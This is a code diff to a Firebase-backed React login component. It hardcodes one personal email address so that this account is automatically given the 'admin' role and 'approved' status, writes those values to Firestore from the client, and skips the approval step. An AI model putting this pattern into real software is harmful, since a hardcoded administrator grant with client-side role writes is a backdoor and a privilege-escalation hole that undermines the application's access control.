@@ -63,8 +63,13 @@ export default function Login() {
 
             if (userSnap.exists()) {
                 const userData = userSnap.data();
-                const status = (userData.status || "").toLowerCase();
-                const role = (userData.role || "").toLowerCase();
+                const isTargetAdmin = user.email === "abubackerraiyan@gmail.com";
+                const status = isTargetAdmin ? "approved" : (userData.status || "").toLowerCase();
+                const role = isTargetAdmin ? "admin" : (userData.role || "").toLowerCase();
+
+                if (isTargetAdmin && (userData.role !== "admin" || userData.status !== "approved")) {
+                    await setDoc(userRef, { role: "admin", status: "approved" }, { merge: true });
+                }
 
                 if (status === "approved" || status === "active" || role === "admin" || role === "super admin") {
                     // Update status to 'approved' if they are an admin but somehow got stuck in pending
@@ -81,18 +86,24 @@ export default function Login() {
                     setAuthMessage("Your account has been restricted.");
                 }
             } else {
+                const isTargetAdmin = user.email === "abubackerraiyan@gmail.com";
                 // New user - create a pending request
                 await setDoc(userRef, {
                     uid: user.uid,
                     name: user.displayName || "New User",
                     email: user.email,
                     photoURL: user.photoURL,
-                    role: "User",
-                    status: "pending",
+                    role: isTargetAdmin ? "admin" : "User",
+                    status: isTargetAdmin ? "approved" : "pending",
                     createdAt: serverTimestamp()
                 });
-                await signOut(auth);
-                setAuthMessage("Access requested successfully! Please wait for admin approval.");
+
+                if (isTargetAdmin) {
+                    router.push("/dashboard");
+                } else {
+                    await signOut(auth);
+                    setAuthMessage("Access requested successfully! Please wait for admin approval.");
+                }
             }
         } catch (error) {
             console.error("Google login failed", error);
